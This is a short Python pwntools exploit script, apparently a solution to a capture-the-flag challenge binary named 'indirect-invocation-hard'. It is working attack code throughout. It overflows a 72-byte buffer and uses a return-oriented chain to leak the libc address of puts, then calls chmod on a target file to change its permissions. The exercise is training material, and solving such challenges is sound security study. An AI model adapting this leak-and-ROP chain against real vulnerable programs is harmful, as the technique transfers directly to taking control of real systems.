from pwn import *
context(os='linux', arch='amd64', log_level='debug')
main_addr=0x4016B7
pop_rdi_ret=0x4016a0
pop_rsi_ret=0x401698
puts_got=0x404020
puts_plt=0x4010B0
puts=0x84420
chmod=0x10dd80
buflen=72
file_addr=0x400509

p=process("/challenge/indirect-invocation-hard")
payload=b'a'*buflen+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
p.send(payload)
p.recvuntil("Leaving!\n",drop=True)
puts_addr=u64(p.recvuntil("\n",drop=True).ljust(8,b'\x00'))
print("[Leak]:puts_addr=",hex(puts_addr))
chmod_addr=puts_addr-puts+chmod

payload2=b'a'*buflen+p64(pop_rdi_ret)+p64(file_addr)+p64(pop_rsi_ret)+p64(4)+p64(chmod_addr)
p.send(payload2)
print(p.recvall())
p.interactive()
